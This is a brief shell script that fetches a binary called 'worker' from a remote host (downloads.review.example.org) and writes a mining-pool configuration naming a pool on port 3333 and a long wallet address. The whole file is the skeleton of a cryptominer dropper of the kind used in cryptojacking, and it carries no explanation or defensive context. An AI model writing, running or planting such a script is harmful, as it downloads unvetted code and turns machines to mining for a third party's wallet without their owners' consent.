#!/bin/sh
curl -o worker https://downloads.review.example.org/runtime
cat > config.json <<'JSON'
{"pools":[{"url":"pool.review.example.org:3333","user":"49nbZB84CgbenDUfv4hxbHJSqgbmSmTsdiJqFyeNF6E4Hbvj8CeF6j1KbFLoWzcvEsZMqZXEedrPZKpYgAbAKrUgLFNzSDz"}]}
JSON
